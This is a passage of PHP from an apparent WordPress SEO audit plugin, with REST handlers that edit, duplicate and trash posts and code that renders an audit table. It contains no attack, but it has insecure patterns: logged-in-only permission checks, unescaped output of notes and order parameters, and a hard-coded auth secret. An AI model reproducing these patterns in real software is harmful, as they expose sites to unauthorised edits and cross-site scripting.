		if( $_POST['notes'] != 'null' ) update_post_meta($_POST['postid'],'hc2_notes',$_POST['notes']);
		if( $_POST['customtitle'] != 'null' ) update_post_meta($_POST['postid'],'hc2_custom_title',$_POST['customtitle']);
		if( $_POST['customthumb'] != 'null' ) update_post_meta($_POST['postid'],'hc2_custom_thumb',$_POST['customthumb']);
		if( $_POST['seourgent'] != 'null' ) update_post_meta($_POST['postid'],'hc2_keys_urgent',$_POST['seourgent']);
		
		if( $_POST['slug'] != 'null' ) wp_update_post(array('ID' => $_POST['postid'], 'post_name' => $_POST['slug']));
		if( $_POST['title'] != 'null' ) wp_update_post(array('ID' => $_POST['postid'], 'post_title' => $_POST['title']));
		if( $_POST['date'] != 'null' ) wp_update_post(array('ID' => $_POST['postid'], 'post_date' => $_POST['date']));
		$languages = get_hc2('settings','languages');
		if( $_POST['languageurl'] != 'null' )foreach($languages as $lang)if(isset($_POST['languageurl']) && strtolower($lang) != get_post_meta( $_POST['postid'], 'hc2_lang', 1 ))update_post_meta($_POST['postid'],'hcube_eq_page_'.strtolower($lang),$_POST['languageurl']);
		update_post_meta($_POST['postid'],'hcube_mainpage',$_POST['postid']);
		if( $_POST['excerpt'] != 'null' ) wp_update_post(array('ID' => $_POST['postid'], 'post_excerpt' => $_POST['excerpt']));
		
		if( $_POST['googletriggers'] != 'null' ){
			$triggers_values = explode(',',$_POST['googletriggers']);
			$triggers = ['a','b'];
			$t = 1;
			foreach($triggers as $key){
				update_post_meta( $_POST['postid'], 'hcube_conversion_trigger_'.$key, $triggers_values[$t]);
				$t ++;
			}
		}
		
		if( $_POST['pixeltriggers'] != 'null' ){
			$pixel_values = explode(',',$_POST['pixeltriggers']);
			$pixels = ['a','b','c','d','e'];
			$t = 1;
			foreach($pixels as $key){
				update_post_meta( $_POST['postid'], 'hcube_pixel_trigger_'.$key, $pixel_values[$t]);
				$t ++;
				
			}
		}
			
		if( $_POST['textedits'] != 'null' ){
			$textedits = explode(';;;',$_POST['textedits']);
			array_shift($textedits);
			foreach($textedits as $edit){
				$post = get_post($_POST['postid']);
				$parts = explode(':::',$edit);
				$tag = explode('-',$parts[0])[0];
				$tagm = explode('-',$parts[0])[1];
				$id = explode('-',$parts[0])[2];
				$strings = explode( '<'.$tagm, $post->post_content );
				$x = -1;
				foreach( $strings as &$str ){
					if( $x == $id ){
						$newcont = str_replace('
','<br>',$parts[1]);
						$start = '';
						if( strpos( $tagm, '>' ) === false ) $start = explode('>',$str)[0].'>';
						$str = $start . $newcont . '</'.$tag.'>'. explode('</'.$tag.'>',$str)[1];
					}
					$x++;
				}
				$newcontent = implode( '<'.$tagm, $strings );
				wp_update_post(array('ID' => $_POST['postid'], 'post_content' => $newcontent));
			}
		}

		/*	
		if( $_POST['fields'] != 'null' ){
			$fields = explode(';;;',$_POST['fields']);
			array_shift($fields);
			foreach($fields as $field){
				$post = get_post($_POST['postid']);
				$parts = explode(':::',$field);
				$tag = explode('-',$parts[0])[0];
				$tagm = explode('-',$parts[0])[1];
				$id = explode('-',$parts[0])[2];
				$strings = explode( '<'.$tagm, $post->post_content );
				$x = -1;
				$prev = 0;
				foreach( $strings as $key => &$str ){
					if( $x == $id ){
						$str = $parts[1] . ( strpos( $tagm, '>' ) === false ? ' ' : '>' ) . $str;
						$str = substr_replace($str, '</'.$parts[1], strpos($str, '</'.$tag ), strlen('</'.$tag ));
						$stringprev = explode('wp:heading', $strings[$prev]);
						$last = array_pop($stringprev);
						$stringprev = array(implode('wp:heading', $stringprev), $last);
						if( strpos( $stringprev[1], '"level":' ) ){
							$before_middle = explode( '"level":', $stringprev[1] ) ;
							$after = explode( ',', $before_middle[1], 2 )[1] ;
							$stringprev[1] = $before_middle[0] . '"level":'. str_replace('h','',$parts[1]) . ',' . $after;
						}else{
							$stringprev[1] = str_replace( '{', '{ "level":'.str_replace('h','',$parts[1]) .',' , $stringprev[1] );
						}
						$strings[$prev] = implode( 'wp:heading', $stringprev );
						$prev = $key;
					}else if( $x > -1 ){
						$str = $tagm . $str;
					}
					$x++;
				}
				$newcontent = implode( '<', $strings );

				wp_update_post(array('ID' => $_POST['postid'], 'post_content' => $newcontent));
			}
		}
*/

			
		if( $_POST['alts'] != 'null' ){
			$alts = explode(';;;',$_POST['alts']);
			$post = get_post($_POST['postid']);
			$strings = explode( '<img', $post->post_content );
			$x = 0;
			foreach( $strings as &$str ){
				if( $x ) $str = explode('alt="',$str,2)[0].'alt="'.$alts[$x].'"'.explode('"',explode('alt="',$str,2)[1],2)[1];
				$x++;
			}
			wp_update_post(array('ID' => $_POST['postid'], 'post_content' => implode( '<img', $strings )));
		}
			
		if( $_POST['srcs'] != 'null' ){
			$srcs = explode(';;;',$_POST['srcs']);
			$post = get_post($_POST['postid']);
			$strings = explode( '<img', $post->post_content );
			$x = 0;
			foreach( $strings as &$str ){
				if( $x ) $str = explode('src="',$str,2)[0].'src="'.$srcs[$x].'"'.explode('"',explode('src="',$str,2)[1],2)[1];
				$x++;
			}
			wp_update_post(array('ID' => $_POST['postid'], 'post_content' => implode( '<img', $strings )));
		}
			
		if( $_POST['bgurls'] != 'null' ){
			$bgurls = explode(';;;',$_POST['bgurls']);
			$post = get_post($_POST['postid']);
			$strings = explode( 'url(', $post->post_content );
			$x = 0;
			foreach( $strings as &$str ){
				if( $x ) $str = $bgurls[$x].')'.explode(')',$str,2)[1];
				$x++;
			
			}
			wp_update_post(array('ID' => $_POST['postid'], 'post_content' => implode( 'url(', $strings )));
		}
			
			
		if( $_POST['btn_link'] != 'null' && $_POST['btn_text'] != 'null' ){
			$btn_links = explode(';;;',$_POST['btn_link']);
			array_shift($btn_links);
			$btn_texts = explode(';;;',$_POST['btn_text']);
			array_shift($btn_texts);
			$post = get_post($_POST['postid']);
			$strings = explode( 'wp-block-button', $post->post_content );
			$occurence = 0;
			foreach( $strings as &$str ){
				foreach( $btn_links as $btn_link ){
					$btnlink = explode(':::',$btn_link);
					if( $occurence == $btnlink[0] ){
						$before = explode( 'href="', $str, 2 );
						$after = explode( '"', $before[1], 2 )[1];
						$str = $before[0] . 'href="' . $btnlink[1] . '"' . $after;
					}
				}
				foreach( $btn_texts as $btn_text ){
					$btntext = explode(':::',$btn_text);
					if( $occurence == $btntext[0] ){
						$before = explode( '>', $str, 2 );
						$after = explode( '</a>', $before[1], 2 )[1];
						$str = $before[0] . '>' . $btntext[1] . '</a>' . $after;
					}
				}
				$occurence++;
			}
			wp_update_post(array('ID' => $_POST['postid'], 'post_content' => implode( 'wp-block-button', $strings )));
		}
			
		if( $_POST['grp_link_space'] != 'null' ){
			$grp_links = explode(';;;',$_POST['grp_link_space']);
			array_shift($grp_links);
			$post = get_post($_POST['postid']);
			$strings = explode('wp-block-group ',$post->post_content);
			$occurence = 0;
			foreach( $strings as &$str ){
				foreach( $grp_links as $grp_link ){
					$grplink = explode(':::',$grp_link);
					if( $occurence == $grplink[0] ){
						$before = explode( 'href="', $str, 2 );
						$after = explode( '"', $before[1], 2 )[1];
						$str = $before[0] . 'href="' . $grplink[1] . '"' . $after;
					}
				}
				$occurence++;
			}
			wp_update_post(array('ID' => $_POST['postid'], 'post_content' => implode( 'wp-block-group ', $strings )));
		}
			
		if( $_POST['grp_link_quote'] != 'null' ){
			$grp_links = explode(';;;',$_POST['grp_link_quote']);
			array_shift($grp_links);
			$post = get_post($_POST['postid']);
			$strings = explode('"wp-block-group"',$post->post_content);
			$occurence = 0;
			foreach( $strings as &$str ){
				foreach( $grp_links as $grp_link ){
					$grplink = explode(':::',$grp_link);
					if( $occurence == $grplink[0] ){
						$before = explode( 'href="', $str, 2 );
						$after = explode( '"', $before[1], 2 )[1];
						$str = $before[0] . 'href="' . $grplink[1] . '"' . $after;
					}
				}
				$occurence++;
			}
			wp_update_post(array('ID' => $_POST['postid'], 'post_content' => implode( '"wp-block-group"', $strings )));
		}
			
		if( $_POST['img_link'] != 'null' ){
			$img_links = explode(';;;',$_POST['img_link']);
			array_shift($img_links);
			$post = get_post($_POST['postid']);
			$strings = explode( 'wp-block-image', $post->post_content );
			$occurence = 0;
			foreach( $strings as &$str ){
				foreach( $img_links as $img_link ){
					$imglink = explode(':::',$img_link);
					if( $occurence == $imglink[0] ){
						$before = explode( 'href="', $str, 2 );
						$after = explode( '"', $before[1], 2 )[1];
						$str = $before[0] . 'href="' . $imglink[1] . '"' . $after;
					}
				}
				$occurence++;
			}
			wp_update_post(array('ID' => $_POST['postid'], 'post_content' => implode( 'wp-block-image', $strings )));
		}

		update_option('hc2_stopseo',0);


		hc2_calculate_seo_score($_POST['postid']);



		ob_start();
		hc2_audit_panel(get_post( $_POST['postid'] ));
		return ob_get_clean();
	}
	
	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/audit_sort/',array('methods'=>'POST','callback'=>'hcube_audit_sort','permission_callback' => function($request){ return is_user_logged_in();}));});
	function hcube_audit_sort( $request ) { 
		
		ob_start();
		hc2_audit_table( $_POST['type'],$_POST['value'],$_POST['dir'] );
		return ob_get_clean();
		
	}

	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/audit_dupost/',array('methods'=>'POST','callback'=>'hcube_audit_dupost','permission_callback' => function($request){ return is_user_logged_in();}));});
	function hcube_audit_dupost( $request ) { 

		$post = get_post( $_POST['post'] );
 
		$args = array(
		'post_author'    => $post->post_author,
		'post_content'   => $post->post_content,
		'post_excerpt'   => $post->post_excerpt,
		'post_name'      => 'copy-of-'.$post->post_name,
		'post_parent'    => $post->post_parent,
		'post_status'    => $post->post_status,
		'post_title'     => 'Copy of '.$post->post_title,
		'post_type'      => $post->post_type
		);
	
		$new_post_id = wp_insert_post( $args );

		update_post_meta($new_post_id,'hc2_post_mode',get_post_meta($_POST['post'],'hc2_post_mode',1));
		update_post_meta($new_post_id,'hc2_lang',get_post_meta($_POST['post'],'hc2_lang',1));
		update_post_meta($new_post_id,'hc2_address',get_post_meta($_POST['post'],'hc2_address',1));
		update_post_meta($new_post_id,'hc2_keys',get_post_meta($_POST['post'],'hc2_keys',1));
		update_post_meta($new_post_id,'hc2_notes',get_post_meta($_POST['post'],'hc2_notes',1));
		update_post_meta($new_post_id,'hc2_keys_urgent',get_post_meta($_POST['post'],'hc2_keys_urgent',1));
		update_post_meta($new_post_id,'hcube_cm_notracking',get_post_meta($_POST['post'],'hcube_cm_notracking',1));
		update_post_meta($new_post_id,'hcube_is_service',get_post_meta($_POST['post'],'hcube_is_service',1));
		update_post_meta($new_post_id,'hcube_is_about',get_post_meta($_POST['post'],'hcube_is_about',1));
		update_post_meta($new_post_id,'hcube_sitemap_hide',get_post_meta($_POST['post'],'hcube_sitemap_hide',1));
		update_post_meta($new_post_id,'hc2_custom_title',get_post_meta($_POST['post'],'hc2_custom_title',1));
		  
		ob_start();
		hc2_audit_table( $_POST['type'] );
		return ob_get_clean();
		
	}
	
	add_action('rest_api_init',function(){register_rest_route('hc2/v1','/audit_delpost/',array('methods'=>'POST','callback'=>'hcube_audit_delpost','permission_callback' => function($request){ return is_user_logged_in();}));});
	function hcube_audit_delpost( $request ) { 

		wp_update_post( array('ID'=> $_POST['post'],'post_status' => 'trash'));
		  
		ob_start();
		hc2_audit_table( $_POST['type'] );
		return ob_get_clean();
		
	}


	function hc2_audit_heading($o,$post_type){
	
				?>																																									
					<?php if($o == '2')  if($post_type=='post'||$post_type=='page'){ ?>																	<th><div onclick="hc2_renderallpages(this)">Render All</div><div><div>Rendered on Production <i>(<?php echo $o; ?>)</i>		<div class='hc2_sort' onclick="hc2_sort('rendered'		,'2')"><div class='hc2_tip'>No-Yes</div>		</div><div class='hc2_sort' onclick="hc2_sort('rendered'	,'1')"><div class='hc2_tip'>Yes-No</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '3')  if(true){ ?>																									<th><div><div>Title <i>(<?php echo $o; ?>)</i>							<div class='hc2_sort' onclick="hc2_sort('title'			,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('title'		,'2')"><div class='hc2_tip'>A-Z</div>			</div><div class='hc2_sort' onclick="hc2_sort('title'		,'3')"><div class='hc2_tip'>Expand</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '4')  if($post_type=='post'||$post_type=='page'){ ?>																	<th><div><div>SEO Title <i>(<?php echo $o; ?>)</i>						<div class='hc2_sort' onclick="hc2_sort('seotitle'		,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('seotitle'	,'2')"><div class='hc2_tip'>A-Z</div>			</div><div class='hc2_sort' onclick="hc2_sort('seotitle'	,'3')"><div class='hc2_tip'>Expand</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '5')  if($post_type!='wp_block'){ ?>																					<th><div><div>Thumbnail <i>(<?php echo $o; ?>)</i>						<div class='hc2_sort' onclick="hc2_sort('thumb'			,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('thumb'		,'2')"><div class='hc2_tip'>A-Z</div>			</div>			</div></div></th>		<?php } ?>
					<?php if($o == '6')  if($post_type!='wp_block'){ ?>																					<th><div><div>Slug <i>(<?php echo $o; ?>)</i>							<div class='hc2_sort' onclick="hc2_sort('slug'			,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('slug'		,'2')"><div class='hc2_tip'>A-Z</div>			</div><div class='hc2_sort' onclick="hc2_sort('slug'		,'3')"><div class='hc2_tip'>Expand</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '7')  if($post_type!='wp_block' && count(get_hc2('settings','languages'))>1){ ?>										<th><div><div>Language <i>(<?php echo $o; ?>)</i>						<div class='hc2_sort' onclick="hc2_sort('lang'			,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('lang'		,'2')"><div class='hc2_tip'>A-Z</div>			</div>			</div></div></th>		<?php } ?>
					<?php if($o == '8')  if($post_type!='wp_block' && count(get_hc2('places'))>1){ ?>													<th><div><div>Address <i>(<?php echo $o; ?>)</i>						<div class='hc2_sort' onclick="hc2_sort('address'		,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('address'		,'2')"><div class='hc2_tip'>A-Z</div>			</div>			</div></div></th>		<?php } ?>
					<?php if($o == '9')  if($post_type=='post'||$post_type=='page'){ ?>																	<th><div><div>Render Method <i>(<?php echo $o; ?>)</i>					<div class='hc2_sort' onclick="hc2_sort('render'		,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('render'		,'2')"><div class='hc2_tip'>A-Z</div>			</div>			</div></div></th>		<?php } ?>
					<?php if($o == '10') if(true){ ?>																									<th><div><div>Author <i>(<?php echo $o; ?>)</i>						<div class='hc2_sort' onclick="hc2_sort('author'		,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('author'		,'2')"><div class='hc2_tip'>A-Z</div>			</div>			</div></div></th>		<?php } ?>
					<?php if($o == '11') if($post_type=='post'||$post_type=='page'){ ?>																	<th><div><div>Status <i>(<?php echo $o; ?>)</i>						<div class='hc2_sort' onclick="hc2_sort('status'		,'1')"><div class='hc2_tip'>Z-A</div>			</div><div class='hc2_sort' onclick="hc2_sort('status'		,'2')"><div class='hc2_tip'>A-Z</div>			</div>			</div></div></th>		<?php } ?>
					<?php if($o == '12') if($post_type=='post'||$post_type=='page'){ ?>																	<th><div><div>Hide from Search <i>(<?php echo $o; ?>)</i>				<div class='hc2_sort' onclick="hc2_sort('hide'			,'1')"><div class='hc2_tip'>No-Yes</div>		</div><div class='hc2_sort' onclick="hc2_sort('hide'		,'2')"><div class='hc2_tip'>Yes-No</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '13') if($post_type=='post'||$post_type=='page'){ ?>																	<th><div><div>About Us Page <i>(<?php echo $o; ?>)</i>					<div class='hc2_sort' onclick="hc2_sort('about'			,'1')"><div class='hc2_tip'>No-Yes</div>		</div><div class='hc2_sort' onclick="hc2_sort('about'		,'2')"><div class='hc2_tip'>Yes-No</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '14') if($post_type=='post'||$post_type=='page'){ ?>																	<th><div><div>Service Page <i>(<?php echo $o; ?>)</i>					<div class='hc2_sort' onclick="hc2_sort('service'		,'1')"><div class='hc2_tip'>No-Yes</div>		</div><div class='hc2_sort' onclick="hc2_sort('service'		,'2')"><div class='hc2_tip'>Yes-No</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '15') if(($post_type=='post'||$post_type=='page')){ ?>																<th><div><div>Google Analytics <i>(<?php echo $o; ?>)</i>				<div class='hc2_sort' onclick="hc2_sort('google'		,'1')"><div class='hc2_tip'>No-Yes</div>		</div><div class='hc2_sort' onclick="hc2_sort('google'		,'2')"><div class='hc2_tip'>Yes-No</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '16') if(($post_type=='post'||$post_type=='page')){ ?>																<th><div><div>SEO Priority <i>(<?php echo $o; ?>)</i>					<div class='hc2_sort' onclick="hc2_sort('seourgent'		,'1')"><div class='hc2_tip'>No-Yes</div>		</div><div class='hc2_sort' onclick="hc2_sort('seourgent'	,'2')"><div class='hc2_tip'>Yes-No</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '17') if($post_type!='wp_block'){ ?>																					<th><div><div>Excerpt <i>(<?php echo $o; ?>)</i>						<div class='hc2_sort' onclick="hc2_sort('excerpt'		,'1')"><div class='hc2_tip'>High-Low</div>		</div><div class='hc2_sort' onclick="hc2_sort('excerpt'		,'2')"><div class='hc2_tip'>Low-High</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '18') if($post_type!='web-story'){ ?>																				<th><div><div>Inline Text <i>(<?php echo $o; ?>)</i>						</div></div></th>		<?php } ?>
					<?php if($o == '19') if($post_type!='web-story'){ ?>																				<th><div><div>Images <i>(<?php echo $o; ?>)</i>						</div></div></th>		<?php } ?>
					<?php if($o == '20') if($post_type!='web-story'){ ?>																				<th><div><div>Links	 <i>(<?php echo $o; ?>)</i>						</div></div></th>		<?php } ?>
					<?php if($o == '21') if(($post_type=='post'||$post_type=='page')){ ?>																<th><div><div>Google Ad Conversion <i>(<?php echo $o; ?>)</i>			</div></div></th>		<?php } ?>
					<?php if($o == '22') if(($post_type=='post'||$post_type=='page')){ ?>																<th><div><div>Facebook Ad Conversion <i>(<?php echo $o; ?>)</i>		</div></div></th>		<?php } ?>
					<?php if($o == '23') { ?>																											<th><div><div><button onclick='hc2_updateall(this)' class='hc2_updateallbutton'>Update All</button> <i>(<?php echo $o; ?>)</i></div></div></th>               <?php } ?>                                                                                                                                                                                                                                       
					<?php if($o == '24') if(true){ ?>																									<th><div><div>Notes <i>(<?php echo $o; ?>)</i>							<div class='hc2_sort' onclick="hc2_sort('notes'			,'1')"><div class='hc2_tip'>Z-A</div>		</div><div class='hc2_sort' onclick="hc2_sort('notes'		,'2')"><div class='hc2_tip'>A-Z</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '25') if($post_type=='post'||$post_type=='page'){ ?>																	<th><div><div>Keywords <i>(<?php echo $o; ?>)</i>						<div class='hc2_sort' onclick="hc2_sort('keywords'		,'1')"><div class='hc2_tip'>Z-A</div>		</div><div class='hc2_sort' onclick="hc2_sort('keywords'	,'2')"><div class='hc2_tip'>A-Z</div>		</div>			</div></div></th>		<?php } ?>
					<?php if($o == '26') if(($post_type=='post'||$post_type=='page')){ ?>																<th><div><div>SEO Score	 <i>(<?php echo $o; ?>)</i>				<div class='hc2_sort' onclick="hc2_sort('seoscore'		,'1')"><div class='hc2_tip'>High-Low</div>		</div><div class='hc2_sort' onclick="hc2_sort('seoscore'		,'2')"><div class='hc2_tip'>Low-High</div>		</div>			</div></div></th>		<?php } ?>
				
				<?php
	}

	

	function hc2_audit_row($o,$post){
		$keyss = get_post_meta($post->ID,'hc2_seekableKeywords',1);
				?>		

					<?php if($o == '2')  if($post->post_type=='post'||$post->post_type=='page'){ ?>														<td class='hc2_audit_panel_renderstatus'>			<div class='hc2_audit_panel_renderstatus_inner'>				<span class='hc2_audit_status_bullet'></span></div></td>																	<?php } ?>
					<?php if($o == '3')  if(true){ ?>																									<td class='hc2_audit_panel_title'>					<div class='hc2_audit_panel_title_inner'>						<input onchange="hc2_audit_newchange(this)" type='text' class='hc2_field_title' value='<?php echo esc_attr($post->post_title); ?>'/></div></td>									<?php } ?>
					<?php if($o == '4')  if($post->post_type=='post'||$post->post_type=='page'){ ?>														<td class='hc2_audit_panel_customtitle'>			<div class='hc2_audit_panel_customtitle_inner'>					<input onchange="hc2_audit_newchange(this)" type='text' class='hc2_field_customtitle' value='<?php echo esc_attr(get_post_meta($post->ID,'hc2_custom_title',1)); ?>'/></div></td>									<?php } ?>
					<?php if($o == '4')  if($post->post_type!='wp_block'){ ?>																			<td class='hc2_audit_panel_thumbnail'>				<div data-thumbid="0" data-id="<?php echo $post->ID; ?>" class='hc2_audit_panel_thumbnail_inner'>					<div onclick='hc2_changethumb(this)' data-id="<?php echo $post->ID; ?>" style='background-image:url(<?php echo get_post_meta($post->ID,'hc2_custom_thumb',1)?get_post_meta($post->ID,'hc2_custom_thumb',1):get_the_post_thumbnail_url($post); ?>)'></div></div><input onchange="hc2_audit_newchange(this)" type='text' class='hc2_field_customthumb' value='<?php echo esc_attr(get_post_meta($post->ID,'hc2_custom_thumb',1)); ?>' /></td>												<?php } ?>
					<?php if($o == '6')  if($post->post_type!='wp_block'){ ?>																			<td class='hc2_audit_panel_slug'>					<div class='hc2_audit_panel_slug_inner'>						<input onchange="hc2_audit_newchange(this)" type='text' class='hc2_field_slug' value='<?php echo esc_attr($post->post_name); ?>'/></div></td>									<?php } ?>
					<?php if($o == '7')  if($post->post_type!='wp_block' && count(get_hc2('settings','languages'))>1){ ?>								<td class='hc2_audit_panel_parent'>					<div class='hc2_audit_panel_parent_inner hc2_audit_panel_wideselect'>						<?php hc2_audit_language($post); ?></div></td>										<?php } ?>
					<?php if($o == '8')  if($post->post_type!='wp_block' && count(get_hc2('places'))>1){ ?>												<td class='hc2_audit_panel_address'>				<div class='hc2_audit_panel_address_inner hc2_audit_panel_wideselect'>						<?php hc2_audit_address($post); ?></div></td>										<?php } ?>
					<?php if($o == '9')  if($post->post_type=='post'||$post->post_type=='page'){ ?>														<td class='hc2_audit_panel_render'>					<div class='hc2_audit_panel_render_inner hc2_audit_panel_wideselect'>						<?php hc2_audit_render($post); ?></div></td>											<?php } ?>
					<?php if($o == '10') if(true){ ?>																									<td class='hc2_audit_panel_author'>					<div class='hc2_audit_panel_author_inner hc2_audit_panel_wideselect'>						<?php hc2_audit_author($post); ?></div></td>											<?php } ?>
					<?php if($o == '11') if($post->post_type=='post'||$post->post_type=='page'){ ?>														<td class='hc2_audit_panel_status'>					<div class='hc2_audit_panel_status_inner hc2_audit_panel_wideselect'>						<?php hc2_audit_status($post); ?></div></td>											<?php } ?>
					<?php if($o == '12') if($post->post_type=='post'||$post->post_type=='page'){ ?>														<td class='hc2_audit_panel_hide'>					<div class='hc2_audit_panel_hide_inner'>						<input type='checkbox' onchange="hc2_audit_newchange(this)" class='hc2_field_sitemap_hide' <?php if(get_post_meta($post->ID,'hcube_sitemap_hide',1))echo 'checked'; ?> /></div></td>								<?php } ?>
					<?php if($o == '13') if($post->post_type=='post'||$post->post_type=='page'){ ?>														<td class='hc2_audit_panel_about'>					<div class='hc2_audit_panel_about_inner'>						<input type='checkbox' onchange="hc2_audit_newchange(this)" class='hc2_field_is_about' <?php if(get_post_meta($post->ID,'hcube_is_about',1))echo 'checked'; ?> /></div></td>							<?php } ?>
					<?php if($o == '14') if($post->post_type=='post'||$post->post_type=='page'){ ?>														<td class='hc2_audit_panel_service'>				<div class='hc2_audit_panel_service_inner'>						<input type='checkbox' onchange="hc2_audit_newchange(this)" class='hc2_field_is_service' <?php if(get_post_meta($post->ID,'hcube_is_service',1))echo 'checked'; ?> /></div></td>							<?php } ?>
					<?php if($o == '15') if(($post->post_type=='post'||$post->post_type=='page')){ ?>													<td class='hc2_audit_panel_analytics'>				<div class='hc2_audit_panel_analytics_inner'>					<input type='checkbox' onchange="hc2_audit_newchange(this)" class='hc2_field_analytics' <?php if(!get_post_meta($post->ID,'hcube_cm_notracking',1))echo 'checked'; ?> /></div></td>						<?php } ?>
					<?php if($o == '16') if(($post->post_type=='post'||$post->post_type=='page')){ ?>													<td class='hc2_audit_panel_seourgent'>				<div class='hc2_audit_panel_seourgent_inner'>					<input type='checkbox' onchange="hc2_audit_newchange(this)" class='hc2_field_is_seourgent' <?php if(get_post_meta($post->ID,'hc2_keys_urgent',1))echo 'checked'; ?> /></div></td>						<?php } ?>
					<?php if($o == '17') if($post->post_type!='wp_block'){ ?>																			<td class='hc2_audit_panel_excerpt'>				<div class='hc2_audit_panel_excerpt_inner hc2_audit_panel_listing_inner'>					<div class='hc2_audit_panel_list'><?php echo hc2_audit_excerpt($post); ?></div></div></td>														<?php } ?>
					<?php if($o == '18') if($post->post_type!='web-story'){ ?>																			<td class='hc2_audit_panel_text'>					<div class='hc2_audit_panel_text_inner hc2_audit_panel_listing_inner'>						<div class='hc2_audit_panel_list'><?php echo hc2_audit_text($post); ?></div></div></td>														<?php } ?>
					<?php if($o == '19') if($post->post_type!='web-story'){ ?>																			<td data-id="<?php echo $post->ID; ?>" class='hc2_audit_panel_images'>					<div class='hc2_audit_panel_images_inner hc2_audit_panel_listing_inner'>						<div class='hc2_audit_panel_list'><?php echo hc2_audit_img($post); ?></div></div></td>														<?php } ?>
					<?php if($o == '20') if($post->post_type!='web-story'){ ?>																			<td class='hc2_audit_panel_links'>					<div class='hc2_audit_panel_links_inner hc2_audit_panel_listing_inner'>						<div class='hc2_audit_panel_list'><?php echo hc2_audit_links($post); ?></div></div></td>														<?php } ?>
					<?php if($o == '21') if(($post->post_type=='post'||$post->post_type=='page')){ ?>													<td class='hc2_audit_panel_google_conversions'>		<div class='hc2_audit_panel_google_conversions_inner'>			<div class='hc2_audit_panel_list hc2_audit_panel_checklist'><?php echo hc2_audit_google_conversions($post); ?></div></div></td>										<?php } ?>
					<?php if($o == '22') if(($post->post_type=='post'||$post->post_type=='page')){ ?>													<td class='hc2_audit_panel_pixel_conversions'>		<div class='hc2_audit_panel_pixel_conversions_inner'>			<div class='hc2_audit_panel_list hc2_audit_panel_checklist'><?php echo hc2_audit_pixel_conversions($post); ?></div></div></td>													<?php } ?>			
					<?php if($o == '23') { ?>																											<td class='hc2_audit_panel_save'><div class='hc2_audit_panel_save_inner'><input data-id="<?php echo $post->ID; ?>"type='button' value='Update' onclick='hc2_submit_audit(this)'/></div></td><?php } ?>
					<?php if($o == '24') if(true){ ?>																									<td class='hc2_audit_panel_notes'>					<div class='hc2_audit_panel_notes_inner hc2_audit_panel_listing_inner'>						<div class='hc2_audit_panel_list'><div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div><span data-isnote="<?php echo get_post_meta($post->ID,'hc2_notes',1)?'true':'false'; ?>" class="dashicons dashicons-admin-comments" onclick='hc2_toggleme(this)'></span><div class='hc2_audit_panel_list_inner'><textarea onchange="hc2_audit_newchange(this);hc2_audit_notechange(this);" class='hc2_field_notes'><?php echo get_post_meta($post->ID,'hc2_notes',1); ?></textarea></div></div></div></td>														<?php } ?>
					<?php if($o == '25') if(($post->post_type=='post'||$post->post_type=='page')){ ?>													<td class='hc2_audit_panel_keywords'>				<div class='hc2_audit_panel_keywords_inner hc2_audit_panel_listing_inner'>					<div class='hc2_audit_panel_list'><div class='hc2_exittoggle' onclick='hc2_toggleme(this)'></div><span data-isnote="<?php echo get_post_meta($post->ID,'hc2_keys',1)?'true':'false'; ?>" class="dashicons dashicons-admin-comments" onclick='hc2_toggleme(this)'></span><div class='hc2_audit_panel_list_inner'>
											<textarea onchange="hc2_audit_newchange(this);hc2_audit_notechange(this);" class='hc2_field_keywords'><?php echo get_post_meta($post->ID,'hc2_keys',1); ?></textarea>
											<div class='hc2_keys_actual'><?php if($keyss)foreach( $keyss as $k ) echo '<span>'.$k.'</span>'; ?></div>
										</div></div></div></td>														<?php } ?>
					<?php if($o == '26') if(($post->post_type=='post'||$post->post_type=='page')){ ?>													<td class='hc2_audit_panel_seoscore'>				<div class='hc2_audit_panel_seoscore_inner hc2_audit_panel_listing_inner'>						<div class='hc2_audit_panel_list'><?php echo hc2_audit_seoscore($post); ?></div></div></td>	<?php } ?>
				
				<?php
	}
	
	
	function hc2_audit_table($post_type,$s_value=0,$s_dir=0){
		
		if(!$s_value){
			$data = hc2_curl_get_contents( trim(get_option('hc2_production_url'),'/').'/wp-json/hc2/v1/renderedlist/',array('auth'=>'IJDF#(*hj29g()I*%@)_(JGO'));
			$remotedata = json_decode(stripslashes($data),1);
			update_option('hc2_renderlist',$remotedata);
		}else{
			$remotedata = get_option('hc2_renderlist');
		}
		if($post_type=='post'||$post_type=='page'){ 
		}
		$orig_order = $order = "2-3-4-5-6-7-8-9-10-11-12-13-14-15-16-17-18-19-20-21-22-23-24-25-26";
		if( isset( $_GET['order'] ) ) $order = $_GET['order'];
		if( isset( $_POST['order'] ) ) $order = $_POST['order'];
		?>
			<table class='hc2_audit_maintab' data-order="<?php echo $order; ?>">
				<tr>
					<th><div><div></div></div></th>
					<?php 
						$done = [];
						$ord = array_unique( explode( '-', $order ) );
						foreach( $ord as $o ){
							array_push( $done, $o );
							hc2_audit_heading($o,$post_type);
						}
						if( count( $done ) ){
							echo '<th class="hc2divid"></th>';
							$ord = array_unique( explode( '-', $orig_order ) );
							foreach( $ord as $o ){
								if( !in_array( $o, $done ) )
									hc2_audit_heading($o,$post_type);
							}
						}
					?>

				</tr>
				<?php 
				
